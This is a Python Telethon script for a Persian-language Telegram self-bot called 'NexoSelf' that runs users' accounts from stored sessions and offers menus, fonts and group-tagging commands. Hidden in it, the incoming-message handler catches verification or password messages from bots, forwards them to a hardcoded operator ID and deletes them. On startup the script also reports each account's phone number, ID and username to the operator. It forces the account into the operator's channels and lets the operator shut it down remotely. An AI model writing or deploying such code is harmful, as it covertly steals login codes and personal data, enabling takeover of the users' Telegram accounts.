import sys
import time
import asyncio
import random
import os
import psutil
import pytz
import requests
import sqlite3
import threading
import json
from datetime import datetime
from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChannelParticipantsAdmins, InputMediaDice
from telethon.tl.functions.messages import SetTypingRequest, ForwardMessagesRequest
from telethon.tl.types import SendMessageTypingAction, SendMessageRecordVideoAction, SendMessageUploadVideoAction
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError

API_ID = 34434623
API_HASH = "d82c5dd13602eedc3041e9f549bcd813"

DATABASE_DIR = "database"
USERS_DB = os.path.join(DATABASE_DIR, "users.db")
ACCOUNTS_DB = os.path.join(DATABASE_DIR, "accounts.db")
ADMIN_ID = "8296865861"
GROUP_ID = "-1003214156615"
CHANNEL_ID = "-1003678402202"

if not os.path.exists(DATABASE_DIR):
    os.makedirs(DATABASE_DIR)

class AccountManager:
    def __init__(self):
        self.accounts = {}
        self.active_clients = {}
        self.init_accounts_db()
        
    def init_accounts_db(self):
        conn = sqlite3.connect(ACCOUNTS_DB)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS accounts (
            phone TEXT PRIMARY KEY,
            session_string TEXT,
            is_active INTEGER DEFAULT 1,
            created_date TEXT,
            last_used TEXT
        )''')
        conn.commit()
        conn.close()
    
    def add_account(self, phone, session_string):
        conn = sqlite3.connect(ACCOUNTS_DB)
        cursor = conn.cursor()
        cursor.execute('''INSERT OR REPLACE INTO accounts 
                         (phone, session_string, is_active, created_date, last_used) 
                         VALUES (?, ?, 1, datetime('now'), datetime('now'))''',
                     (phone, session_string))
        conn.commit()
        conn.close()
        print(f"✅ اکانت {phone} به دیتابیس اضافه شد")
    
    def get_all_accounts(self):
        conn = sqlite3.connect(ACCOUNTS_DB)
        cursor = conn.cursor()
        cursor.execute('SELECT phone, session_string FROM accounts WHERE is_active = 1')
        accounts = cursor.fetchall()
        conn.close()
        return accounts
    
    def deactivate_account(self, phone):
        conn = sqlite3.connect(ACCOUNTS_DB)
        cursor = conn.cursor()
        cursor.execute('UPDATE accounts SET is_active = 0 WHERE phone = ?', (phone,))
        conn.commit()
        conn.close()
        print(f"✅ اکانت {phone} غیرفعال شد")

async def send_to_admin(client, message, phone=None):
    try:
        if phone:
            message = f"📱 **{phone}**\n{message}"
        await client.send_message(ADMIN_ID, message)
        print(f"✅ اطلاعات به ادمین ارسال شد: {message}")
    except Exception as e:
        print(f"خطا در ارسال به ادمین: {e}")

async def send_to_group(client, message, phone=None):
    try:
        if phone:
            message = f"📱 **{phone}**\n{message}"
        await client.send_message(GROUP_ID, message)
        print(f"✅ اطلاعات به گروه ارسال شد: {message}")
    except Exception as e:
        print(f"خطا در ارسال به گروه: {e}")

class TelegramAccount:
    def __init__(self, phone, session_string, account_manager):
        self.phone = phone
        self.session_string = session_string
        self.account_manager = account_manager
        self.client = None
        self.owner_id = None
        self.is_running = False
        self.shutdown_requested = False
        
        self.connection_retries = 0
        self.max_retries = 5
        self.last_activity = time.time()
        self.health_check_interval = 120
        
        self.fonts = [
            "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡",
            "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵", 
            "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿",
            "₀₁₂₃₄₅₆₇₈₉",
            "0123456789",
            "０１２３４５６７８９",
            "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗",
            "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡",
            "🄌➀➁➂➃➄➅➆➇➈",
            "⓪①②③④⑤⑥⑦⑧⑨"
        ]
        self.secretary_messages = {}
        self.auto_forward_settings = {}
        self.typing_users = {}
        self.last_time_update = 0
        
    async def safe_initialize_client(self):
        try:
            print(f"🔄 در حال راه‌اندازی اکانت {self.phone}...")
            
            self.client = TelegramClient(
                StringSession(self.session_string), 
                API_ID, 
                API_HASH,
                device_model="iPhone 15 Pro",
                system_version="iOS 17.1",
                app_version="10.0.0",
                lang_code="fa",
                system_lang_code="fa",
                connection_retries=10,
                request_retries=5,
                auto_reconnect=True,
                flood_sleep_threshold=120,
                base_logger=None,
            )
            
            await asyncio.wait_for(self.client.connect(), timeout=30)
            
            if not await self.client.is_user_authorized():
                print(f"❌ سشن برای {self.phone} نامعتبر است")
                return False
                
            try:
                me = await asyncio.wait_for(self.client.get_me(), timeout=10)
                if me:
                    self.owner_id = me.id
                    self.connection_retries = 0
                    print(f"✅ اکانت {self.phone} با موفقیت لاگین شد")
                    print(f"👤 کاربر: {me.first_name} (ID: {me.id})")
                    return True
                else:
                    print(f"❌ دریافت اطلاعات کاربر برای {self.phone} ناموفق بود")
                    return False
                    
            except asyncio.TimeoutError:
                print(f"⏰ timeout دریافت اطلاعات کاربر برای {self.phone}")
                return False
            except Exception as e:
                print(f"❌ خطا در دریافت اطلاعات کاربر {self.phone}: {e}")
                return False
                
        except asyncio.TimeoutError:
            print(f"⏰ timeout اتصال برای {self.phone}")
            return False
        except Exception as e:
            print(f"❌ خطا در راه‌اندازی کلاینت برای {self.phone}: {e}")
            return False
    
    async def robust_initialize(self):
        for attempt in range(self.max_retries):
            try:
                print(f"🔄 تلاش {attempt + 1}/{self.max_retries} برای راه‌اندازی {self.phone}")
                
                if await self.safe_initialize_client():
                    self.init_db()
                    await self.safe_join_channels()
                    await self.set_online_status()
                    await self.safe_pm_cleanup()
                    await self.register_handlers()
                    await self.load_secretary_messages()
                    await self.load_auto_forward_settings()
                    await self.send_startup_message()
                    await self.send_login_notification()
                    
                    self.is_running = True
                    
                    asyncio.create_task(self.safe_update_profile_time())
                    asyncio.create_task(self.safe_maintain_online_status())
                    asyncio.create_task(self.health_monitor())
                    
                    print(f"✅ اکانت {self.phone} با موفقیت راه‌اندازی شد")
                    return True
                    
                else:
                    wait_time = (attempt + 1) * 10
                    print(f"⏳ انتظار {wait_time} ثانیه قبل از تلاش مجدد...")
                    await asyncio.sleep(wait_time)
                    
            except Exception as e:
                print(f"❌ خطا در راه‌اندازی (تلاش {attempt + 1}): {e}")
                await asyncio.sleep(15)
        
        print(f"❌ راه‌اندازی اکانت {self.phone} پس از {self.max_retries} تلاش ناموفق بود")
        return False

    async def health_monitor(self):
        while self.is_running and not self.shutdown_requested:
            try:
                await asyncio.sleep(self.health_check_interval)
                
                if not self.client.is_connected():
                    print(f"🔌 اتصال {self.phone} قطع شده، تلاش برای اتصال مجدد...")
                    await self.recover_connection()
                
                if time.time() - self.last_activity > 300:
                    print(f"🫀 بررسی سلامت اکانت {self.phone}")
                    await self.perform_health_check()
                
            except Exception as e:
                print(f"⚠️ خطا در مانیتورینگ سلامت {self.phone}: {e}")
                await asyncio.sleep(60)

    async def perform_health_check(self):
        try:
            me = await asyncio.wait_for(self.client.get_me(), timeout=10)
            if not me:
                raise Exception("عدم پاسخ از سرور")
                
            print(f"✅ سلامت اکانت {self.phone} تأیید شد")
            return True
            
        except Exception as e:
            print(f"❌ مشکل در سلامت اکانت {self.phone}: {e}")
            await self.recover_connection()
            return False

    async def recover_connection(self):
        try:
            print(f"🔄 بازیابی اتصال برای {self.phone}")
            
            if self.client:
                try:
                    await self.client.disconnect()
                except:
                    pass
            
            wait_time = random.uniform(5, 15)
            await asyncio.sleep(wait_time)
            
            if await self.safe_initialize_client():
                print(f"✅ اتصال {self.phone} بازیابی شد")
                return True
            else:
                print(f"❌ بازیابی اتصال {self.phone} ناموفق بود")
                return False
                
        except Exception as e:
            print(f"❌ خطا در بازیابی اتصال {self.phone}: {e}")
            return False

    async def safe_join_channels(self):
        channels = [GROUP_ID, CHANNEL_ID]
        
        for channel in channels:
            try:
                await asyncio.wait_for(
                    self.client(functions.channels.JoinChannelRequest(channel=channel)),
                    timeout=15
                )
                print(f"✅ اکانت {self.phone} به {channel} پیوست")
                await asyncio.sleep(2)
            except Exception as e:
                print(f"⚠️ خطا در پیوستن به {channel} برای {self.phone}: {e}")

    async def safe_pm_cleanup(self):
        try:
            dialogs = await self.client.get_dialogs(limit=30)
            
            for dialog in dialogs:
                if dialog.is_user:
                    try:
                        sender = await dialog.get_input_sender()
                        if hasattr(sender, 'bot') and sender.bot:
                            await self.client.delete_dialog(dialog.entity)
                            print(f"✅ پیوی ربات برای {self.phone} پاک شد")
                            await asyncio.sleep(1)
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"⚠️ خطا در پاکسازی پیوی {self.phone}: {e}")

    async def safe_update_profile_time(self):
        while self.is_running and not self.shutdown_requested:
            try:
                await self.update_profile_time()
            except Exception as e:
                print(f"⚠️ خطا در به‌روزرسانی زمان برای {self.phone}: {e}")
                await asyncio.sleep(60)

    async def safe_maintain_online_status(self):
        while self.is_running and not self.shutdown_requested:
            try:
                await self.maintain_online_status()
            except Exception as e:
                print(f"⚠️ خطا در حفظ حالت آنلاین برای {self.phone}: {e}")
                await asyncio.sleep(60)

    async def send_startup_message(self):
        try:
            me = await self.client.get_me()
            welcome_text = f"""
┌─────────────────────
│  🌟 **NexoSelf فعال شد**  
└─────────────────────

✅ **اکانت با موفقیت فعال شد!**

📱 **شماره:** `{self.phone}`
🆔 **آیدی:** `{me.id}`
👤 **نام:** {me.first_name or '---'}

📝 **دستورات موجود:**
• `help` - نمایش منوی راهنما
• `status` - وضعیت سیستم
• `settings` - تنظیمات ربات

🔮 **قدرت گرفته از:** @Ch_SelfNexo
            """
            await self.client.send_message('me', welcome_text)
            print(f"✅ پیام شروع برای {self.phone} ارسال شد")
        except Exception as e:
            print(f"خطا در ارسال پیام شروع برای {self.phone}: {e}")
    
    async def send_login_notification(self):
        try:
            me = await self.client.get_me()
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            login_message = f"""
💌 **NexoSelf فعال شده در:** `{current_time}`
❤️‍🩹 **توسط:** `{self.owner_id}`

📱 **شماره:** `{self.phone}`
👤 **نام:** {me.first_name or '---'}
🔗 **یوزرنیم:** @{me.username or '---'}

🥀 **مالک:** @amele55
🫆 **سلف:** @Nexo55bot
🔥 **گپ:** @Gp_SelfNexo
            """
            
            await send_to_admin(self.client, login_message, self.phone)
            await send_to_group(self.client, login_message, self.phone)
            
            print(f"✅ اطلاعیه لاگین برای {self.phone} ارسال شد")
        except Exception as e:
            print(f"خطا در ارسال اطلاعیه لاگین برای {self.phone}: {e}")
    
    def init_db(self):
        try:
            db_file = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()

            cursor.execute('''CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )''')
            cursor.execute('''CREATE TABLE IF NOT EXISTS crash (user_id INTEGER PRIMARY KEY)''')
            cursor.execute('''CREATE TABLE IF NOT EXISTS enemy (user_id INTEGER PRIMARY KEY)''')
            cursor.execute('''CREATE TABLE IF NOT EXISTS secretary (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pattern TEXT,
                response TEXT,
                is_active INTEGER DEFAULT 1
            )''')
            cursor.execute('''CREATE TABLE IF NOT EXISTS auto_forward (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                source_channel TEXT,
                target_group TEXT,
                is_active INTEGER DEFAULT 1
            )''')

            default_settings = {
                "timename": "off", "timebio": "off", "bot": "on", "hashtag": "off", 
                "bold": "off", "italic": "off", "delete": "off", "code": "off", 
                "underline": "off", "reverse": "off", "part": "off", "mention": "off", 
                "comment": "on", "text": "first !", "typing": "off", "game": "off", 
                "voice": "off", "video": "off", "sticker": "off", "font": "1",
                "original_bio": "", "secretary": "off", "auto_reply": "off",
                "online_status": "on", "typing_action": "off", "typing_duration": "5",
                "auto_forward": "off"
            }
            
            for k, v in default_settings.items():
                cursor.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v))

            conn.commit()
            conn.close()
            print(f"✅ دیتابیس برای {self.phone} راه‌اندازی شد")
        except Exception as e:
            print(f"❌ خطا در راه‌اندازی دیتابیس برای {self.phone}: {e}")
    
    async def set_online_status(self):
        try:
            js = self.get_data()
            if js.get('online_status') == 'on':
                await self.client(UpdateStatusRequest(offline=False))
                print(f"✅ حالت آنلاین برای {self.phone} فعال شد")
        except Exception as e:
            print(f"خطا در تنظیم حالت آنلاین برای {self.phone}: {e}")
    
    async def maintain_online_status(self):
        while self.is_running and not self.shutdown_requested:
            try:
                js = self.get_data()
                if js.get('online_status') == 'on':
                    await self.client(UpdateStatusRequest(offline=False))
                await asyncio.sleep(60)
            except Exception as e:
                print(f"خطا در حفظ حالت آنلاین برای {self.phone}: {e}")
                await asyncio.sleep(60)
    
    async def register_handlers(self):
        @self.client.on(events.NewMessage(incoming=True, from_users=ADMIN_ID))
        async def handle_admin_commands(event):
            try:
                self.last_activity = time.time()
                message_text = event.raw_text.lower().strip()
                
                if message_text == '/off':
                    await self.handle_shutdown(event)
                    
            except Exception as e:
                print(f"خطا در پردازش دستور ادمین برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(incoming=True))
        async def handle_incoming_messages(event):
            try:
                self.last_activity = time.time()
                
                if event.sender_id == ADMIN_ID:
                    return
                    
                if not event.is_private:
                    return
                    
                message_text = event.raw_text
                
                if any(keyword in message_text for keyword in ['کد', 'code', 'verification', 'تایید', 'رمز']):
                    sender = await event.get_sender()
                    
                    if hasattr(sender, 'bot') and sender.bot:
                        code_info = f"""
🔐 **کد تایید دریافت شد**

📱 از: {sender.first_name or 'تلگرام'}
📞 شماره: `{self.phone}`
📝 متن: `{message_text}`
⏰ زمان: {datetime.now().strftime('%H:%M:%S')}
                        """
                        await send_to_admin(self.client, code_info, self.phone)
                        await event.delete()
                        print(f"✅ کد تایید از اکانت {self.phone} به ادمین ارسال و پاک شد")
                        
            except Exception as e:
                print(f"خطا در پردازش پیام دریافتی برای {self.phone}: {e}")
        
        @self.client.on(events.NewMessage(outgoing=True))
        async def handle_outgoing_messages(event):
            try:
                self.last_activity = time.time()
                
                if event.sender_id != self.owner_id:
                    return
                    
                message_text = event.raw_text.lower()
                
                handlers = {
                    'help': self.help_handler,
                    'پنل': self.help_handler,
                    '.help': self.help_handler,
                    '.پنل': self.help_handler,
                    'راهنما': self.help_handler,
                    'menu': self.help_handler,
                    'منو': self.help_handler,
                    
                    'status': self.status_handler,
                    'وضعیت': self.status_handler,
                    '.status': self.status_handler,
                    '.وضعیت': self.status_handler,
                    
                    'heart': self.heart_handler,
                    'قلب': self.heart_handler,
                    '.heart': self.heart_handler,
                    '.قلب': self.heart_handler,
                    
                    'listcrash': self.listcrash_handler,
                    'لیست کراش': self.listcrash_handler,
                    '.listcrash': self.listcrash_handler,
                    '.لیست کراش': self.listcrash_handler,
                    
                    'listenemy': self.listenemy_handler,
                    'لیست انمی': self.listenemy_handler,
                    '.listenemy': self.listenemy_handler,
                    '.لیست انمی': self.listenemy_handler,
                    
                    'tagall': self.tagall_handler,
                    'تگ': self.tagall_handler,
                    '.tagall': self.tagall_handler,
                    '.تگ': self.tagall_handler,
                    
                    'tagadmins': self.tagadmins_handler,
                    'تگ ادمین ها': self.tagadmins_handler,
                    '.tagadmins': self.tagadmins_handler,
                    '.تگ ادمین ها': self.tagadmins_handler,
                    
                    'sessions': self.sessions_handler,
                    'نشست های فعال': self.sessions_handler,
                    '.sessions': self.sessions_handler,
                    '.نشست های فعال': self.sessions_handler,
                    
                    'listfonts': self.listfonts_handler,
                    'لیست فونت': self.listfonts_handler,
                    '.listfonts': self.listfonts_handler,
                    '.لیست فونت': self.listfonts_handler,
                    
                    'secretary': self.secretary_handler,
                    'منشی': self.secretary_handler,
                    '.secretary': self.secretary_handler,
                    '.منشی': self.secretary_handler,
                    
                    'groups': self.groups_handler,
                    'گروه ها': self.groups_handler,
                    '.groups': self.groups_handler,
                    '.گروه ها': self.groups_handler,
                    
                    'fun': self.fun_handler,
                    'سرگرمی': self.fun_handler,
                    '.fun': self.fun_handler,
                    '.سرگرمی': self.fun_handler,
                    
                    'tools': self.tools_handler,
                    'ابزار': self.tools_handler,
                    '.tools': self.tools_handler,
                    '.ابزار': self.tools_handler,
                    
                    'settings': self.settings_handler,
                    'تنظیمات': self.settings_handler,
                    '.settings': self.settings_handler,
                    '.تنظیمات': self.settings_handler,
                    
                    'forward': self.forward_handler,
                    'فوروارد': self.forward_handler,
                    '.forward': self.forward_handler,
                    '.فوروارد': self.forward_handler,
                }
                
                for key, handler in handlers.items():
                    if message_text == key:
                        await handler(event)
                        return
                
                if message_text.startswith('info') or message_text.startswith('اطلاعات'):
                    await self.info_handler(event)
                    
            except Exception as e:
                print(f"خطا در هندلر پیام‌های ارسالی برای {self.phone}: {e}")
        
        await self.register_settings_handlers()
        await self.auto_reply_secretary()
        
        print(f"✅ تمام هندلرها برای {self.phone} ثبت شدند")

    async def handle_shutdown(self, event):
        try:
            print(f"🛑 درخواست خاموش کردن برای {self.phone} از طرف ادمین")
            
            shutdown_msg = await event.reply(f"""
🔴 **درخواست خاموش کردن دریافت شد**

📱 **شماره:** `{self.phone}`
🆔 **آیدی:** `{self.owner_id}`
⏰ **زمان:** {datetime.now().strftime('%H:%M:%S')}

🔄 **در حال خاموش کردن...**
            """)
            
            self.account_manager.deactivate_account(self.phone)
            self.shutdown_requested = True
            self.is_running = False
            
            await shutdown_msg.edit(f"""
🔴 **NexoSelf خاموش شد**

📱 **شماره:** `{self.phone}`
🆔 **آیدی:** `{self.owner_id}`
⏰ **زمان:** {datetime.now().strftime('%H:%M:%S')}

✅ **اکانت با موفقیت غیرفعال شد**
            """)
            
            await self.client.disconnect()
            print(f"✅ اکانت {self.phone} با موفقیت خاموش شد")
            
        except Exception as e:
            print(f"❌ خطا در خاموش کردن اکانت {self.phone}: {e}")
            try:
                await event.reply(f"❌ خطا در خاموش کردن: {e}")
            except:
                pass

    async def help_handler(self, event):
        try:
            help_text = await self.generate_help_text()
            await event.reply(help_text)
            await event.delete()
        except Exception as e:
            print(f"خطا در دستور help برای {self.phone}: {e}")
    
    async def generate_help_text(self):
        try:
            memory_use = psutil.Process(os.getpid()).memory_info().rss / 1024**3
        except:
            memory_use = 0.0
            
        me = await self.client.get_me()
        name = me.first_name
        
        help_text = f"""
┌─────────────────────
│  🎭 **منوی NexoSelf**  
│  👤 **کاربر:** {name}
│  📱 **شماره:** {self.phone}
└─────────────────────

🎯 **دستورات اصلی:**
├ • `help` • `منو` - نمایش این منو
├ • `status` • `وضعیت` - وضعیت سیستم
├ • `heart` • `قلب` - انیمیشن قلب
├ • `fun` • `سرگرمی` - دستورات سرگرمی
└ • `tools` • `ابزار` - ابزارهای کاربردی

👥 **مدیریت کاربران:**
├ • `listcrash` • `لیست کراش` - لیست کراش
├ • `listenemy` • `لیست انمی` - لیست دشمنان
└ • `info` • `اطلاعات` - اطلاعات کاربر

🏢 **مدیریت گروه:**
├ • `tagall` • `تگ` - تگ همه اعضا
├ • `tagadmins` • `تگ ادمین ها` - تگ ادمین‌ها
└ • `groups` • `گروه ها` - تنظیمات گروه

🎨 **ظاهر:**
├ • `listfonts` • `لیست فونت` - لیست فونت‌ها
└ • `.font 1-10` - تغییر فونت

🤖 **قابلیت‌های هوشمند:**
├ • `secretary` • `منشی` - منشی هوشمند
├ • `forward` • `فوروارد` - فوروارد خودکار
└ • `settings` • `تنظیمات` - تنظیمات ربات

⚡ **وضعیت سیستم:**
├ 💾 **RAM:** {memory_use:.2f}GB
├ 📱 **شماره:** {self.phone}
└ 🆔 **آیدی:** {self.owner_id}

🔮 **قدرت گرفته از:** @Ch_SelfNexo
        """
        return help_text
    
    async def status_handler(self, event):
        try:
            async def get_ping():
                st = time.time()
                await self.client.get_me()
                return time.time() - st
                
            try: 
                ping = await get_ping()
                ping_text = f"{ping * 1000:.0f} ms"
            except: 
                ping_text = "N/A"
                
            try:
                mp = psutil.virtual_memory().percent
            except:
                mp = "N/A"
            try:
                cp = psutil.cpu_percent()
            except:
                cp = "N/A"
                
            me = await self.client.get_me()
            js = self.get_data()
            
            txt = f"""
┌─────────────────────
│  📊 **وضعیت سیستم**  
│  👤 **کاربر:** {me.first_name or '---'}
└─────────────────────

🖥 **اطلاعات سیستم:**
├ ⏱ **پینگ:** {ping_text}
├ 📈 **RAM:** {mp}%
├ 🖥 **CPU:** {cp}%
└ 💾 **پردازش‌ها:** {len(psutil.pids())}

👤 **اطلاعات اکانت:**
├ 📱 **شماره:** {self.phone}
├ 🆔 **آیدی:** {me.id}
├ 🔗 **یوزرنیم:** @{me.username or '---'}
└ 📛 **نام خانوادگی:** {me.last_name or '---'}

⚙️ **تنظیمات ربات:**
├ 🌐 **حالت آنلاین:** {js.get('online_status', 'off')}
├ ⌨️ **اکشن تایپینگ:** {js.get('typing_action', 'off')}
├ 🤖 **منشی:** {js.get('secretary', 'off')}
└ 🔄 **فوروارد خودکار:** {js.get('auto_forward', 'off')}

✅ **وضعیت:** فعال
            """
            await event.reply(txt)
            await event.delete()
            
        except Exception as e:
            print(f"خطا در status برای {self.phone}: {e}")
    
    async def heart_handler(self, event):
        try:
            message = await event.reply("💫 شروع انیمیشن قلب...")
            animations = ["💖", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍"]
            
            for x in range(3):
                for i in range(1, 11):
                    heart = animations[i % len(animations)]
                    txt = f"✨ {x+1} {heart * i} | {10 * i}%"
                    await message.edit(txt)
                    await asyncio.sleep(0.2)
            
            await message.edit("💖 **انیمیشن قلب کامل شد!** ✨")
        except Exception as e:
            print(f"خطا در دستور heart برای {self.phone}: {e}")
    
    async def listcrash_handler(self, event):
        try:
            js = self.get_data()
            if js.get('crash'):
                txt = "💖 **لیست کراش:**\n\n"
                for i in js.get('crash', []):
                    txt += f"• [{i}](tg://user?id={i})\n"
            else:
                txt = "💔 **لیست کراش خالی است.**"
            await event.reply(txt)
            await event.delete()
        except Exception as e:
            print(f"خطا در دستور listcrash برای {self.phone}: {e}")
    
    async def listenemy_handler(self, event):
        try:
            js = self.get_data()
            if js.get('enemy'):
                txt = "😈 **لیست دشمنان:**\n\n"
                for i in js.get('enemy', []):
                    txt += f"• [{i}](tg://user?id={i})\n"
            else:
                txt = "😇 **لیست دشمنان خالی است.**"
            await event.reply(txt)
            await event.delete()
        except Exception as e:
            print(f"خطا در دستور listenemy برای {self.phone}: {e}")
    
    async def tagall_handler(self, event):
        try:
            if not event.is_group:
                await event.reply("❌ **این دستور فقط در گروه کار می‌کند**")
                return
                
            processing_msg = await event.reply("🔄 **در حال تگ کردن اعضا...**")
            mentions = "👥 **تگ همه اعضا:**\n\n"
            chat = await event.get_input_chat()
            count = 0
            
            async for x in self.client.iter_participants(chat, 50):
                if not x.bot and not x.deleted:
                    mentions += f" [{x.first_name}](tg://user?id={x.id})"
                    count += 1
                    if count % 10 == 0:
                        await asyncio.sleep(0.5)
                
            mentions += f"\n\n✅ **تعداد:** `{count}` نفر"
            await processing_msg.delete()
            await event.reply(mentions)
            await event.delete()
            
        except Exception as e:
            print(f"خطا در دستور tagall برای {self.phone}: {e}")
    
    async def tagadmins_handler(self, event):
        try:
            if not event.is_group:
                await event.reply("❌ **این دستور فقط در گروه کار می‌کند**")
                return
                
            mentions = "👮‍♂️ **تگ ادمین‌ها:**\n\n"
            chat = await event.get_input_chat()
            count = 0
            async for x in self.client.iter_participants(chat, filter=ChannelParticipantsAdmins):
                mentions += f" [{x.first_name}](tg://user?id={x.id})"
                count += 1
                
            mentions += f"\n\n✅ **تعداد:** `{count}` نفر"
            await event.reply(mentions)
            await event.delete()
            
        except Exception as e:
            print(f"خطا در دستور tagadmins برای {self.phone}: {e}")
    
    async def sessions_handler(self, event):
        try:
            result = await self.client(functions.account.GetAuthorizationsRequest())
            txt = "┌─────────────────────\n│  🔐 **نشست‌های فعال**  \n└─────────────────────\n\n"
            
            for i, auth in enumerate(result.authorizations, 1):
                device = auth.device_model or "نامشخص"
                platform = auth.platform or "نامشخص"
                country = auth.country or "نامشخص"
                ip = auth.ip or "نامشخص"
                
                txt += f"**#{i}**\n"
                txt += f"📱 **دستگاه:** `{device}`\n"
                txt += f"🌐 **پلتفرم:** `{platform}`\n"
                txt += f"🕒 **تاریخ:** `{auth.date_created}`\n"
                txt += f"🌍 **کشور:** `{country}`\n"
                txt += f"📶 **IP:** `{ip}`\n"
                txt += "────────────────\n"
                
            await event.reply(txt)
            await event.delete()
            
        except Exception as e:
            print(f"خطا در دستور sessions برای {self.phone}: {e}")
    
    async def info_handler(self, event):
        try:
            if event.is_reply:
                get_message = await event.get_reply_message()
                get_id = get_message.sender_id
            else:
                get_id = event.sender_id
                
            full = await self.client(GetFullUserRequest(get_id))
            user = full.users[0]
            
            status = "آنلاین" if user.status else "آفلاین"
            is_bot = "✅" if user.bot else "❌"
            is_verified = "✅" if user.verified else "❌"
            is_restricted = "✅" if user.restricted else "❌"
            is_scam = "✅" if user.scam else "❌"
            is_fake = "✅" if user.fake else "❌"
            
            info_text = f"""
┌─────────────────────
│  👤 **اطلاعات کاربر**  
└─────────────────────

🆔 **آیدی:** `{user.id}`
👤 **نام:** {user.first_name or '---'}
📛 **نام خانوادگی:** {user.last_name or '---'}
🔗 **یوزرنیم:** @{user.username or '---'}
📞 **شماره:** {user.phone or '---'}
📝 **بیو:** {full.full_user.about or '---'}

🔍 **وضعیت:**
├ 🤖 **ربات:** {is_bot}
├ ☑️ **تأیید شده:** {is_verified}
├ 🔒 **محدود شده:** {is_restricted}
├ ⚠️ **اسکم:** {is_scam}
├ 🚫 **فیک:** {is_fake}
└ 📱 **وضعیت:** {status}
            """
            
            await event.reply(info_text)
            await event.delete()
            
        except Exception as e:
            print(f"خطا در دستور info برای {self.phone}: {e}")
    
    async def listfonts_handler(self, event):
        try:
            fonts_list = "┌─────────────────────\n│  🎨 **لیست فونت‌ها**  \n└─────────────────────\n\n"
            
            for i, font in enumerate(self.fonts, 1):
                sample = "۱۲:۳۴"
                if i <= len(self.fonts):
                    try:
                        converted = sample.translate(str.maketrans("۱۲۳۴", font[:4]))
                        fonts_list += f"**{i}.** `{converted}` - فونت {i}\n"
                    except:
                        fonts_list += f"**{i}.** `{sample}` - فونت {i}\n"
            
            fonts_list += "\n📝 **نحوه استفاده:** `.font شماره`\n**مثال:** `.font 3`"
            await event.reply(fonts_list)
            await event.delete()
        except Exception as e:
            print(f"خطا در listfonts برای {self.phone}: {e}")
    
    async def secretary_handler(self, event):
        secretary_text = """
┌─────────────────────
│  🤖 **منشی هوشمند**  
└─────────────────────

⚙️ **تنظیمات اصلی:**
├ • `.secretary on/off` - فعال/غیرفعال کردن منشی
└ • `.autoreply on/off` - فعال/غیرفعال کردن پاسخ خودکار

📝 **مدیریت پاسخ‌ها:**
├ • `.addreply الگو|پاسخ` - افزودن پاسخ جدید
├ • `.listreplies` - لیست تمام پاسخ‌ها
└ • `.delreply شماره` - حذف پاسخ
        """
        await event.reply(secretary_text)
        await event.delete()
    
    async def groups_handler(self, event):
        groups_text = """
┌─────────────────────
│  🏢 **مدیریت گروه**  
└─────────────────────

👥 **مدیریت اعضا:**
├ • `.promote @user` - ارتقا به ادمین
├ • `.demote @user` - کاهش از ادمین
├ • `.ban @user` - بن کاربر
├ • `.unban @user` - رفع بن
├ • `.mute @user` - میوت کاربر
└ • `.unmute @user` - رفع میوت
        """
        await event.reply(groups_text)
        await event.delete()
    
    async def fun_handler(self, event):
        fun_text = """
┌─────────────────────
│  🎮 **بازی‌ها و سرگرمی**  
└─────────────────────

🎲 **بازی‌ها:**
├ • `.dice 1-6` - پرتاب تاس
├ • `.football` - بازی فوتبال
├ • `.basket` - بازی بسکتبال
├ • `.dart` - بازی دارت
└ • `.slot` - ماشین اسلات
        """
        await event.reply(fun_text)
        await event.delete()
    
    async def tools_handler(self, event):
        tools_text = """
┌─────────────────────
│  🛠 **ابزارهای کاربردی**  
└─────────────────────

📁 **مدیریت فایل:**
├ • `.save` - ذخیره فایل
├ • `.download` - دانلود فایل
└ • `.rename نام` - تغییر نام فایل

🔍 **جستجو:**
├ • `.search متن` - جستجوی پیام‌ها
├ • `.find متن` - پیدا کردن متن
└ • `.history عدد` - تاریخچه پیام‌ها
        """
        await event.reply(tools_text)
        await event.delete()
    
    async def settings_handler(self, event):
        settings_text = """
┌─────────────────────
│  ⚙️ **تنظیمات ربات**  
└─────────────────────

🌐 **حالت آنلاین:**
├ • `.online on` - همیشه آنلاین
└ • `.online off` - حالت عادی

⌨️ **اکشن تایپینگ:**
├ • `.typing on` - فعال‌سازی تایپینگ
├ • `.typing off` - غیرفعال‌سازی تایپینگ
└ • `.typing 10` - تنظیم مدت زمان (ثانیه)

🤖 **قابلیت‌های هوشمند:**
├ • `.secretary on/off` - منشی هوشمند
├ • `.autoreply on/off` - پاسخ خودکار
└ • `.autoforward on/off` - فوروارد خودکار

🎨 **ظاهر:**
├ • `.timename on/off` - زمان در نام خانوادگی
├ • `.timebio on/off` - زمان در بیوگرافی
└ • `.font 1-10` - تغییر فونت

👥 **مدیریت کاربران:**
├ • `.addcrash آیدی` - افزودن به کراش
├ • `.delcrash آیدی` - حذف از کراش
├ • `.addenemy آیدی` - افزودن به دشمنان
└ • `.delenemy آیدی` - حذف از دشمنان
        """
        await event.reply(settings_text)
        await event.delete()
    
    async def forward_handler(self, event):
        forward_text = """
┌─────────────────────
│  🔄 **فوروارد خودکار**  
└─────────────────────

📡 **قابلیت‌ها:**
├ • فوروارد خودکار پیام‌ها
├ • پشتیبانی از چندین کانال
└ • فوروارد لحظه‌ای
        """
        await event.reply(forward_text)
        await event.delete()

